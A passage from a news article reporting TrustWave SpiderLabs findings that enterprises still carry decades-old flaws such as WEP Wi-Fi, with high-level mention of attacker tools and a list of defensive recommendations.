such as the continued use of WEP encryption, legacy 802.11 networks with minimal to no security controls and wireless clients using public \"guest\" networks instead of secured private networks. In almost all of the cases, the most common vulnerabilities unearthed by TrustWave were common well understood issues that should have been addressed a long time ago said Nicholas Percoco, senior vice president at TrustWave's SpiderLabs research unit. \"There are basically two themes,\" Percoco said. \"Through our study in 2009 we found some very old vulnerabilities present within enterprises, some as old as 20 to 30 years.\" The second theme is that attackers are targeting these old flaws to break into enterprises, then using increasingly sophisticated tools to harvest data from companies, he said. In addition to older keystroke logging and packet sniffing tools, malicious attackers are increasingly employing tools such as memory parsers and credentialed malware to steal data, Percoco said. Memory parsers are used to monitor the random access memory associated with a certain process and to extract specific data from it. Credentialed malware programs are a new class of multi-user programs that have typically been used to steal money and payment card numbers from ATMs. There are several measures companies can take to mitigate the risks posed by older and often overlooked vulnerabilities, TrustWave said. One step is to maintain a complete asset inventory. Many companies are often unaware of all the IT assets they own or of the risks they pose to data, so maintaining an up to date list of assets is vital to protecting them, TrustWave said. Decommissioning older legacy systems as much as possible can also help mitigate the risk. Also, in 80% of the cases that TrustWave looked at, third-parties were responsible for introducing vulnerabilities. So monitoring third-party relationships is key according to the company. Other recommended measures included internal network segmentation, data encryption and stronger Wi-Fi security policies. Source : Click Here" }
